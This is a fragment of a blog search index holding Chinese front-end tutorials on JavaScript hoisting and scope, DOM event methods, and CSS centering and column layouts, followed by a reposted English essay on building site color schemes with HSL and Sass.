解决了变量提升这个问题时，同时带来了另一个问题，那就是临时死区（Temporal Dead Zone， TDZ）。通俗的理解就是，若当前作用域中使用 let 关键字定义了与作用域外部同名的变量，那么在当前作用域内，定义同名变量之前，都不可以使用该变量，即使你的本意是想先使用外部同名变量，再定义内部同名变量。\nlet a = 1; function getA(){ // 在下面这句语句执行之前使用 a 都会报错，即使你想使用的是外面的 a let a = 2; console.log(a); // print out 2 } getA();  const const 与 let 类似，都没有变量提升，都存在临时死区。不同的是，const 声明的变量，只能在声明的同时初始化，之后是不允许赋值的（Object 类型数据除外），否则会报错。若没有在声明的同时初始化，也会报错。\nconst a = 1; a = 2; // error: Assignment to constant variable const b; // error: Missing initializer in const declaration b = 1;  那么看下面的代码：\nconst obj = { name: 'daijt', age: 18 }; obj.nickName = 'captain'; console.log(obj); // {name: 'daijt', age: 18, nickName: 'captain'}  为什么 const 声明的变量又可以修改其中的数据了呢？因为 obj 是个复杂数据，不是简单数据。conts 声明变量的本质是变量中的数据紧致修改，为什么复杂数据可以更改呢？因为 const 声明的变量中存储的是复杂对象的引用地址，而不是真真的数据，仅仅是数据的地址。因此在使用 const 声明了变量来引用复杂数据之后，还是可以修改该复杂数据的值。复杂数据有哪些呢？array Object、object Object、function Object 等。不建议使用 const 声明复杂数据，因为如果稍加不注意，就会更改了不想被改变的复杂数据的值。建议使用 const 声明简单数据，同时变量名大写。为什么简单数据的更改就能检测出来呢？因为简单数据是直接存储在栈内存中的，而不是像复杂对象，栈内存中存储的是堆内存中的引用地址。\n作用域 说起作用域，ES6 新引入了一个块级作用域，之前 ES5 只有全局作用域与函数作用域。\n在 ES6 之前，如果想要定义一个局部变量/私有变量该怎么办呢？答案是利用函数作用域。如果不想定义具名函数，浪费命名空间的话，可以使用立即执行函数（Immediately Invoked Function Expression， IIFE），如何定义立即执行函数？以下可作参考：\n( function(){ code } ).call(); // can return value ( function(){ code } .call()); // can return value ( function(){ code } )(); // can return value ! function(){ code } (); ~ function(){ code } (); + function(){ code } (); - function(){ code } ();  以上几种都是 IIFE，值得注意的是前三种是可以有返回值的。数据可以通过括号传递。例如：\nlet a = (function (num1, num2){ return num1+num2; })(1,2); console.log(a); // print out 3  ES6 中引入了块级作用域，那么声明私有变量/局部变量不用再利用函数作用域了，直接使用块级作用域 {} 即可，值得注意的是在花括号内使用 var 是没有用的，因为 ES5 没有块级作用域的概念。\n// in ES6 let a = 1; { let a = 2; console.log(a); // print 2 } console.log(a); // print 1 // in ES5 var a = 1; { var a = 2; console.log(a); // print 2 } console.log(a); // print 2  那么由作用域可以引入一个经典问题，问以下代码的执行完结果是什么？\nfor(var i = 0; i \u0026lt; 5; i++){ setTimeout(function (){ console.log(i); },1000) } // what will the console print out?  很多人都知道会在 1s 之后打印出 5 个 5 。为什么呢？可以结合变量提升和作用域进行分析。由于 var 没有块级作用域，因此 var i 会声明 i 为全局变量，以上代码执行时情况如下：\n{ var i = 0; setTimeout(function (){ console.log(i); },1000) } ... ... ... { var i = 4; setTimeout(function (){ console.log(i); },1000) }  进一步拆分：\nvar i; i = 0; i = 1; i = 2; i = 3; i = 4; i = 5; console.log(i); console.log(i); console.log(i); console.log(i); console.log(i);  那么 i = 5 是怎么来的呢？因为 i 为全局变量，在不满足循环条件的时候 i === 5，所以在 1s 之后打印出 5 个 5。那么如何打印出 0、1、2、3、4 呢？最简单的方法，将 var 改为 let：\nfor(let i = 0; i \u0026lt; 5; i++){ setTimeout(function (){ console.log(i); },1000) }  将改为 let 的代码进行拆分，如下：\n{ let i = 0; setTimeout(function (){ console.log(i); },1000); } ... ... ... { let i = 4; setTimeout(function (){ console.log(i); },1000); }  由于使用了 let，因此花括号为块级作用域，内部的 i 为局部变量，延时函数在执行时，会优先在当前作用域访问 i，因此会打印出 0、1、2、3、4 。 此外还有其他方法，那就是利用立即执行函数:\nfor(var i = 0; i \u0026lt; 5; i++){ setTimeout(function (){ console.log(i); }.call(),1000) } // print out 0、1、2、3、4  这其中要涉及到事件队列，setTimeout 将第一个参数推入 Event queue 时，发现是个立即执行函数，则立即执行，打印出当前的 i 值。或者还可以改写如下：\nfor(var i = 0; i \u0026lt; 5; i++){ setTimeout(console.log(i),1000); } // print out 0、1、2、3、4  ","permalink":"http://localhost:8000/public/post/js%E5%8F%98%E9%87%8F%E6%8F%90%E5%8D%87%E4%B8%B4%E6%97%B6%E6%AD%BB%E5%8C%BA%E4%BD%9C%E7%94%A8%E5%9F%9F%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/","tags":["","",""],"title":"Js变量提升、临时死区、作用域、立即执行函数"},{"categories":["",""],"contents":" event.preventDefault()用法介绍 该方法将通知 Web 浏览器不要执行与事件关联的默认动作（如果存在这样的动作）。例如，如果 type 属性是 \u0026ldquo;submit\u0026rdquo;，在事件传播的任意阶段可以调用任意的事件句柄，通过调用该方法，可以阻止提交表单。注意，如果 Event 对象的 cancelable 属性是 fasle，那么就没有默认动作，或者不能阻止默认动作。无论哪种情况，调用该方法都没有作用。\n该方法将通知 Web 浏览器不要执行与事件关联的默认动作（如果存在这样的动作）。\n例如，如果 type 属性是 \u0026ldquo;submit\u0026rdquo;，在事件传播的任意阶段可以调用任意的事件句柄，通过调用该方法，可以阻止提交表单。\n注意，如果 Event 对象的 cancelable 属性是 fasle，那么就没有默认动作，或者不能阻止默认动作。无论哪种情况，调用该方法都没有作用。\nevent.stopPropagation()用法介绍 该方法将停止事件的传播，阻止它被分派到其他 Document 节点。在事件传播的任何阶段都可以调用它。注意，虽然该方法不能阻止同一个 Document 节点上的其他事件句柄被调用，但是它可以阻止把事件分派到其他节点\n该方法将停止事件的传播，阻止它被分派到其他 Document 节点。在事件传播的任何阶段都可以调用它。\n注意:虽然该方法不能阻止同一个 Document 节点上的其他事件句柄被调用，但是它可以阻止把事件分派到其他节点。\nevent是DOM的事件方法，所以不是单独使用，比如指定DOM\nDOM 1.元素节点有tagName 、nodeName 、localName属性；其中tagName 、nodeName相同，都是大写，localName是小写；\n其他节点只有nodeName 、localName属性，其中属性节点localName和nodeName相同，文本节点localName为null；\n2.childNodes是指元素的所有直接子节点，包括元素节点、文本节点，不包括属性节点\nchildren 返回元素的所有直接子的元素节点\n二者区别在于后者不包括文本节点\nchildElementCount 表示的是子元素节点的个数，等于children的length；\n3.attibutes 存有html属性，包括class、id等\nproperties\n4.获取元素节点内的所有文本值\ninnerText IE和chrome支持\ntextContent 高版本浏览器支持\n5.outerHTML 与 innerHTML的区别在与是否包换元素本身，包括就是outerHtml;\n","permalink":"http://localhost:8000/public/post/js%E4%BA%8B%E4%BB%B6/","tags":["","",""],"title":"js事件之event.preventDefault()与event.stopPropagation()用法区别"},{"categories":["Front-End","搬运整理"],"contents":" 前端工程师的一门必修课程就是 CSS ( Cascading Style Sheet, 层叠样式表)，CSS 是一门艺术，学好 CSS 需要投入大量的时间去实践。今天我们主要聊一聊工作中常用到的 CSS 布局套路。\n水平居中 内联元素 (inline) \u0026lt;style\u0026gt; .wrapper{ text-align: center; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;inline\u0026quot;\u0026gt;内联元素水平居中\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; 说明：父元素下的子元素会继承 text-align: center 属性；当父元素宽度小于内联元素的宽度时无效。  块级元素 (block) 1、 父元素不定宽，子元素定宽(300px) \u0026lt;style\u0026gt; .block{ width: 200px; margin-left: auto; margin-right: auto； } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;block\u0026quot;\u0026gt;块级元素水平居中\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;  2、父元素定宽（500px），子元素定宽(300px)  第一种：  \u0026lt;style\u0026gt; .wrapper{ padding-left：150px； padding-right：150px； } .block{ width: 200px; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;block\u0026quot;\u0026gt;块级元素水平居中\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   第二种：  \u0026lt;style\u0026gt; .wrapper{ width: 500px; } .block{ width: 200px; margin-left: auto; margin-right: auto； } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;block\u0026quot;\u0026gt;块级元素水平居中\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 说明：推荐使用第一种方法。   使用绝对定位  \u0026lt;style\u0026gt; .wrapper{ position: relative; } .inline{ position: absolute; left: 50%; transform: translateX(-50%); } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;inline\u0026quot;\u0026gt;绝对定位水平居中\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 说明：该方法会适用于内联元素与块级元素；top、bottom、left、right 等属性是参考父元素而定，而 translate 是参考自身而定；值得注意的是，该方法会使内联元素计算出来的 display 属性为 block。   使用 flex  \u0026lt;style\u0026gt; .wrapper{ display: flex; justify-content: center; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;inline\u0026quot;\u0026gt;内联元素 flex 水平居中\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; 说明：若浏览器支持 flex，则强烈推荐使用 flex 布局，父元素下块级元素与内联元素居中表现均为良好；注意在不改变 flex 的方向 flex-deriction 的时候（默认为水平方向），水平居中需设置 justify-content: center，当改变 flex 的方向时（flex-deriction: column），水平居中需设置 align-items: center，垂直居中同理。  垂直居中 内联元素  第一种：给父元素 padding  \u0026lt;style\u0026gt; .wrapper{ padding: 10px; } .inline{ line-height: 30px; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;inline\u0026quot;\u0026gt;内联元素垂直居中\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt;   第二种：给父元素 height  \u0026lt;style\u0026gt; .wrapper{ height: 50px; } .inline{ line-height: 50px; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;inline\u0026quot;\u0026gt;内联元素垂直居中\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; 说明：推荐使用第一种；内联元素的真正占据的高度是由其中文字的 line-height 决定，当内联元素的 line-height 等于其父元素的 height 时，内联元素垂直居中，且其中的文字也是垂直居中的。  块级元素 \u0026lt;style\u0026gt; .wrapper{ display: table; } .block{ display: table-cell; vertical-align: middle; height: 50px; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;block\u0026quot;\u0026gt;块级元素垂直居中\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; 说明：table 定位兼容性良好 (IE8+)；父元素的高度可以利用 padding 撑开。   绝对定位  \u0026lt;style\u0026gt; .wrapper{ position: relative； } .inline{ postion: absolute; top: 50%; transform: translateY(-50%); } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;inline\u0026quot;\u0026gt;内联元素垂直居中\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; 说明： 同水平居中，绝对定位适用于内联元素与块级元素；会使内联元素的 display 计算属性变为 block。   使用 flex  \u0026lt;style\u0026gt; .wrapper{ display: flex; align-items: center; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;inline\u0026quot;\u0026gt;内联元素垂直居中\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; 说明： 通水平居中，在浏览器支持的情况下，推荐使用 flex 布局。  水平垂直居中 绝对定位  第一种：  \u0026lt;style\u0026gt; .wrapper{ position: relative； } .inline{ postion: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;inline\u0026quot;\u0026gt;内联元素垂直居中\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt;   第二种：  \u0026lt;style\u0026gt; .wrapper{ position: relative； } .inline{ position: absolute; margin: auto; top: 0; bottom: 0; left: 0; right: 0; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;inline\u0026quot;\u0026gt;内联元素垂直居中\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; 说明：绝对居中的兼容性良好；第二种方法需要设置子元素的宽高，否则会占满父元素。   使用 flex  \u0026lt;style\u0026gt; .wrapper{ display: flex; } .inline{ margin: auto; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;span class=\u0026quot;inline\u0026quot;\u0026gt;内联元素垂直居中\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; 说明：flex 布局简便快捷，需要注意的是浏览器兼容性。  两列布局 使用 float  1、 一列定宽，一列自适应 (以左列定宽 100px 为例)  \u0026lt;style\u0026gt; .left{ float: left; width: 100px; } .right{ margin-left: 100px; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;left\u0026quot;\u0026gt;左列定宽\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;right\u0026quot;\u0026gt;右列自适应\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 说明：左列脱离标准文档流，右列仍处在标准文档流中，设置 margin-left: 100px; 使其举例左边 100px 以免被左列遮挡。   2、 一列不定宽，一列自适应 (以左列不定宽为例)  \u0026lt;style\u0026gt; .left{ float: left; } .right{ overflw: hidden; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;left\u0026quot;\u0026gt;左列不定宽\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;right\u0026quot;\u0026gt;右列自适应\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;  使用 flex  1、 一列定宽，一列自适应 (以左列定宽 100px 为例)  \u0026lt;style\u0026gt; .wrapper{ display: flex; } .left{ width: 100px; } .right{ flex-grow: 1; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;left\u0026quot;\u0026gt;左列定宽\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;right\u0026quot;\u0026gt;右列自适应\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   2、 一列不定宽，一列自适应 (以左列不定宽为例)  \u0026lt;style\u0026gt; .wrapper{ display: flex; } .right{ flex-grow: 1; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;left\u0026quot;\u0026gt;左列不定宽\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;right\u0026quot;\u0026gt;右列自适应\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;  三列布局 1、 左中定宽，右侧自适应、右中定宽，左侧自适应 说明： 解决方法与两列布局类似\n2、两侧定宽，中间自适应  双飞翼布局 (假设左侧 120px，右侧 130px)  \u0026lt;style\u0026gt; .center-wrapper{ float: left; width: 100%; } .center{ margin-left: 120px; // left aside width margin-right: 130px; // right aside width } .left{ float: left; width: 120px; } .right{ float: left; width: 130px; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;center-wrapper\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;center\u0026quot;\u0026gt;中间列自适应\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;left\u0026quot;\u0026gt;左列定宽 120px\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;right\u0026quot;\u0026gt;右列定宽 130px\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 说明：需要给父元素及子元素高度。   圣杯布局 (假设左侧 120px，右侧 130px)  \u0026lt;style\u0026gt; .wrapper{ position: relative; } .center{ margin-left: 120px; // left aside width margin-right: 130px; // right aside width } .left{ position: absolute; top: 0; left: 0; width: 120px; } .right{ position: absolute; top: 0; right: 0; width: 130px; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;left\u0026quot;\u0026gt;左列定宽 120px\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;center\u0026quot;\u0026gt;中间列自适应\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;right\u0026quot;\u0026gt;右列定宽 130px\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   flex 布局  \u0026lt;style\u0026gt; .wrapper{ display: flex； } .center{ flex-grow: 1; } .left{ width: 120px; } .right{ width: 130px; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026quot;wrapper\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;left\u0026quot;\u0026gt;左列定宽 120px\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;center\u0026quot;\u0026gt;中间列自适应\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;right\u0026quot;\u0026gt;右列定宽 130px\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 说明：可以看出，flex 布局确实快速简洁，但是由于浏览器兼容性问题，目前老版本的浏览器不支持 flex。  ","permalink":"http://localhost:8000/public/post/css%E5%B8%B8%E8%A7%81%E5%B1%85%E4%B8%AD%E5%B8%83%E5%B1%80/","tags":["css","layout"],"title":"Css常见居中布局"},{"categories":["CSS"],"contents":" 转载\n A new approach to one of my biggest design weaknesses, using basic color theory, HSL, and Sass.\n In my work as a designer, color has never been my strong suit. I often try to avoid dealing with it entirely (as seen in the previous version of my site). Through education and experience, I\u0026rsquo;ve picked up the basics of color theory and mostly avoided catastrophe, but my rudimentary process has been anything but reliable.\nMy V6 redesign seemed like a good opportunity to try to improve my color game, since my site is meant to represent me, and I like to think I have a colorful personality. To really make the exercise count, rather than creating one color scheme, I wanted to create a system to which I could apply any number of color schemes. This would give me a space to experiment with color on an ongoing basis, and ideally it would accommodate a range of complexity, giving me room to grow as my skills improve.\nWorking out the contrast The first steps of my color process are unchanged: solidifying the layout in binary black and white before layering in more nuanced contrast in grayscale.\nBeginning with black and white lets me focus on the foundational contrast between the layout elements: size, shape, position.\nWhen everything is in place, grayscale values add another dimension of contrast.\nOnce I have the contrast in a good place, I can extrapolate a palette upon which to map colors. My grayscale contrast work produced these six values:\nLike the typography and layout, the color palette is determined by the site\u0026rsquo;s actual content, rather than being devised in a vacuum and retrofitted onto the content.\n Text (70% gray): The darkest color in the palette. Text Inverse (white): The lightest color in the palette. For now, this is always white, and its neutrality makes it useful for framing images, isolating their colors from mine. Background (6% gray): The second-lightest color in the palette. Dark enough that white can be easily distinguished from it, but light enough that it appears almost white on its own. Background Alt (24% gray): Slightly darker than Background. Used mainly for borders and other non-text interface elements. Accent 1 (54% gray): Bright hue that contrasts significantly with both Text and Background. Used mainly for metadata. Accent 2 (30% gray): Typically the palette\u0026rsquo;s most distinct and saturated color, used sparingly for inline links and other bits that need to really pop.  We\u0026rsquo;ll get back to these specific values a bit later.\nColor selection There are two ways to begin developing a palette for a project: find an existing one or create one from scratch. Finding an existing one is simply a matter of keeping your eyes open. I tend to find the most inspiration in painting, sculpture, illustration, photography, and other visual arts. Colossal is one of my most reliable resources.\nI maintain a collection of images that catch my eye (credits listed below; see a larger version here).\nPalettes devised from the dominant colors of those collected images.\nWhen creating a palette from scratch, I\u0026rsquo;ve long relied on the historical RYB color wheel, which posits that red, yellow, and blue are the primary colors from which all other basic colors are derived. Modern color theory is more sophisticated, which we\u0026rsquo;ll get to shortly, but the RYB color wheel was wired into my brain at an early age, and I still find it useful. Here are some color wheel concepts worth considering when assembling a palette:\nThe RYB color wheel shows the relationship between primary colors (1), secondary colors (2), and tertiary colors (3).\n Red, yellow, and blue are the primary colors. A secondary color is an even combination of any two primaries: yellow plus red equals orange, red plus blue equals violet, blue plus yellow equals green. A tertiary color is an even combination of a primary and an adjacent secondary: yellow-orange, orange-red, red-violet, violet-blue, blue-green, green-yellow. In theory, the purest color pairings are evenly spaced on the wheel, such as complementary colors (opposite each other on the wheel) and triads (a set of three colors forming an equilateral triangle). Otherwise, owing to the ratio of primaries in their makeup, colors pair well with others in their category: primaries with primaries (0:1), secondaries with secondaries (1:1), and tertiaries with tertiaries (2:1).   Harmonious color wheel combinations based on the principles described above. From left to right: two complementary colors, the triad of secondaries, and a selection of four tertiaries (which also happens to be two pairs of complements).\nColor implementation and adjustment Finding a basis for a palette is easy enough, but getting that basic palette to work with a design is rarely a mere matter of transference, and this is where I usually get into trouble. Two of color\u0026rsquo;s biggest stumbling blocks for me have always been implementation and adjustment. \u0026ldquo;I like this yellow, but it\u0026rsquo;s not working as a background color. How do I fix it?\u0026rdquo; Adjusting colors digitally with sliders, color pickers, and hand-coded hex values left me flailing. I couldn\u0026rsquo;t find a method to the madness. And implementing and tweaking them across a larger design system (whether in mockups or code) tended to be an onerous task.\nThankfully, technology exists to address those issues, and my newly emboldened attitude about color was made possible by two technologies that are relatively new to me: HSL and Sass. For color adjustment, HSL brings a level of granular control to the process that other color systems lack. And for implementation, Sass lets me assign color values to variables, which make system-wide iteration quick and painless.\nColor adjustment: HSL The RYB color wheel we went over earlier is intended for mixing paint, ink, dye, etc. It\u0026rsquo;s a _subtractive color_ model, which means that its colors are made visible by subtracting wavelengths from light. Modern color theory has found a broader spectrum of colors in a subtractive model with slightly different primary colors: cyan, magenta, and yellow. These are the basis of CMYK (the K stands for blacK), the process behind most of the full-color printed material you see. Its inverse is the _additive color_ model, RGB, whose primaries are red, green, and blue. This is the basis of color projected in light, as seen on the screens of our TVs, computers, and mobile devices.\nCMY (subtractive) color mixing.\nRGB (additive) color mixing.\nHSL is a representation of the RGB color model. It was invented in 1938 in anticipation of color television, but it didn\u0026rsquo;t find its way into CSS—where it would ultimately be most useful to me—until 2011. HSL stands for hue, saturation, lightness, which are the foundational attributes of color, which I didn\u0026rsquo;t really understand until recently. (A similar system, HSB, has long been available in most design software, but I sadly never pondered how it worked or what it might have to offer.) Here\u0026rsquo;s a quick rundown of the nuts and bolts of HSL:\nThe RGB color wheel. Red (0º), green (120º), and blue (240º) are the primary hues.\nSaturation (top) defines how vivid the color is. Lightness (bottom) defines how much black or white the color has in it.\n Hue defines the basic color. \u0026ldquo;Light green,\u0026rdquo; \u0026ldquo;dark green,\u0026rdquo; \u0026ldquo;bright green,\u0026rdquo; and \u0026ldquo;dull green\u0026rdquo; are all just variations on green, right? So in all those colors, green is the hue. In HSL, a hue is defined by a number between 0 and 360, so it\u0026rsquo;s useful to envision the hue spectrum radially. HSL uses the RGB color wheel shown above. Saturation defines how vivid the color is. Zero percent is gray and 100 percent is fully saturated. Lightness defines how much black (shade) or white (tint) the color has in it. 50 percent has no shade or tint, zero percent is fully black, and 100 percent is fully white.  Here\u0026rsquo;s what HSL syntax looks like in CSS (this is a turquoise, with a 175-degree hue, 100 percent saturation, and 25 percent lightness):\nhsl( 175, 100%, 25% )  I find HSL enormously liberating. Historical color wheel concepts map directly to the 360-degree hue system, and HSL\u0026rsquo;s three foundational attributes let me create and fine-tune color directly in code like never before. Let\u0026rsquo;s take a look at how I\u0026rsquo;m using it with Sass.\nColor implementation: Sass The first step of implementation is to make Sass variables out of the site\u0026rsquo;s six grayscale values I determined earlier. Rather than doing the mental gymnastics of figuring out how those specific grays are expressed in hexadecimal or RGB, I\u0026rsquo;ll just use Sass\u0026rsquo;s built-in darken() function:\n$text-color: darken( white, 70% ); // 70% gray $text-color-inverse: white; // 0% gray $bg-color: darken( white, 6% ); // 6% gray $bg-color-alt: darken( white, 24% ); // 24% gray $accent-color1: darken( white, 54% ); // 54% gray $accent-color2: darken( white, 30% ); // 30% gray  If I use one of those six variables every time I specify a color in my CSS…\narticle { color: $text-color; background-color: $bg-color; } footer { color: $bg-color-alt; background-color: $text-color; }  …I can easily make changes to the color scheme across the entire site by adjusting just those six variables!\nLet\u0026rsquo;s put it to the test with a palette found in the wild. To ease into things, I chose a palette that looks like it\u0026rsquo;ll adapt to my system without needing a lot of adjustment.\nI\u0026rsquo;ll grab the dominant colors using the eyedropper tool in Photoshop or Illustrator. Those apps don\u0026rsquo;t natively support HSL, though, so I\u0026rsquo;ll convert the colors\u0026rsquo; hex values to HSL using Convert a Color, and then plug them into my variables:\n$text-color: hsl( 321, 14%, 44% ); // Pale purple $text-color-inverse: white; // White $bg-color: hsl( 45, 50%, 89% ); // Light tan $bg-color-alt: hsl( 31, 24%, 63% ); // Pale brown $accent-color1: $bg-color-alt; // Pale brown $accent-color2: hsl( 348, 68%, 58% ); // Pale red  The original grayscale values for comparison.\nChange a few variables, get a whole new color palette!\nThis is off to a pretty good start! Right away, I can tell that $bg-color and $bg-color-alt need to be lighter. Also, $accent-color-1 will need to be darker, and since it\u0026rsquo;s based on another variable, I can accomplish that by making use of the darken() function again. (Note that all darken() does is move HSL\u0026rsquo;s lightness attribute a specified amount toward zero.) It doesn\u0026rsquo;t take much tweaking to get things where I want them:\n$text-color: hsl( 321, 14%, 44% ); $text-color-inverse: white; $bg-color: hsl( 45, 50%, 94% ); // +05% lightness $bg-color-alt: hsl( 31, 24%, 88% ); // +25% lightness $accent-color1: darken( $bg-color-alt, 25% ); $accent-color2: hsl( 348, 78%, 68% ); // +10% saturation, +10% lightness  Initially, the transplanted palette doesn\u0026rsquo;t quite work.\nAfter a few adjustments, it does!\nWords can\u0026rsquo;t express how thrilling it is to be able to make these kinds of color adjustments so intuitively in code. But wait, it gets even better. Let\u0026rsquo;s try something a bit more adventurous.\nIf you read this series\u0026rsquo; previous post about typography and proportions, you know I like having a rational basis for design decisions, and I like the components of a system to relate to each other in specific ways. Just as my typographic scale is built on numeric intervals, so are the color wheel principles we looked at earlier. And just as my type sizes are all relative to one base value, my colors can be too.\nSo I\u0026rsquo;m going to build a palette from scratch using a triad, which is three equidistant hues on the color wheel. In HSL, that means the three colors\u0026rsquo; hue attributes will be 120 degrees away from each other. Since this is a predictable interval, I\u0026rsquo;ll choose a base hue and let Sass figure out what the other two hues should be. Remember how darken() adjusts a color\u0026rsquo;s lightness? adjust-hue() does the same for the hue. I\u0026rsquo;ve decided $accent-color2 will be my base color, so it\u0026rsquo;ll move to the top of the variable list. I\u0026rsquo;ll give it a red-orange hue (19 degrees), and use adjust-hue() to give the other variables the appropriate chromatic distance:\n$accent-color2: hsl( 19, 100%, 50% ); $text-color: adjust-hue( $accent-color2, -120deg ); $text-color-inverse: white; $bg-color: adjust-hue( $accent-color2, 120deg ); $bg-color-alt: darken( $bg-color, 15% ); $accent-color1: $bg-color-alt;  I\u0026rsquo;m making a palette from scratch based on this triad.\nAaaaaand some adjustments will be necessary.\nThis palette is clearly going to need more work than the previous one did, but I\u0026rsquo;ve got some excellent tools at my disposal. darken() and adjust-hue() are great for adjusting a single color attribute, but if I want to adjust multiple attributes at a time, adjust-color() is the way to go:\n$accent-color2: hsl( 19, 95%, 60% ); $text-color: adjust-color( $accent-color2, $hue: -120deg, $saturation: -82, $lightness: -18 ); $text-color-inverse: white; $bg-color: adjust-color( $accent-color2, $hue: 120deg, $saturation: -84, $lightness: 35 ); $bg-color-alt: darken( $bg-color, 10% ); $accent-color1: adjust-color( $bg-color, $saturation: 12, $lightness: -35 );  Before adjustments.\nAfter adjustments.\nWith all the colors in this palette set up to be relative to $accent-color2, I can now shift the entire color scheme by adjusting that one variable. Below are a few variations, each of which rotates the previous hue by 90 degrees. This final demonstration uses the homepage, which makes the color differences between the examples more pronounced.\n$accent-color2: hsl( 19, 95%, 60% );\n$accent-color2: hsl( 109, 95%, 60% );\n$accent-color2: hsl( 199, 95%, 60% );\n$accent-color2: hsl( 289, 95%, 60% );\nThese will all need individual adjustments (if they can be made to work at all), but hopefully this makes the point that a fairly uncomplicated combination of HSL and Sass can be hugely helpful in color experimentation and iteration.\nRandomization Now that I have a good system in place for experimenting with color, I don\u0026rsquo;t want to limit my site to just one color scheme. So I\u0026rsquo;ve put together a file called \u0026ldquo;color-override.scss\u0026rdquo; which duplicates every single rule that specifies a color in my main SCSS file—remember, all those rules use my color palette\u0026rsquo;s Sass variables. Then, when I want to make a new color scheme for the site, I use this template:\n$text-color: $text-color-inverse: $bg-color: $bg-color-alt: $accent-color1: $accent-color2: @import \u0026quot;color-override\u0026quot;;  The exported CSS file, a fresh color scheme that overrides the main CSS file\u0026rsquo;s colors, is then added to this inline script\u0026rsquo;s colorSchemes array in my document head:\nUsers with JavaScript enabled now get a random color scheme every time the page is loaded or refreshed!\nConclusion There is still much to learn. I\u0026rsquo;ve got a ways to go before I\u0026rsquo;ll feel like I really know what I\u0026rsquo;m doing with color, but speaking as someone who\u0026rsquo;s struggled with it for decades, the methodologies described in this post feel like a big leap forward. Whether or not it\u0026rsquo;s a leap for you, I hope you find something valuable to take away from it.\nThis is the final post in a series about my site\u0026rsquo;s 2017 redesign. If you haven\u0026rsquo;t already, check out the other posts in the series, which discuss the design\u0026rsquo;s archival philosophy and approach to typography and layout.\nResources Credits for the collected images above, arranged by row:\n Eiko Ojala, Jiyong Lee, Fabienne Rivory, DKNG, Vincent Mahé Markus Reugels, Damian 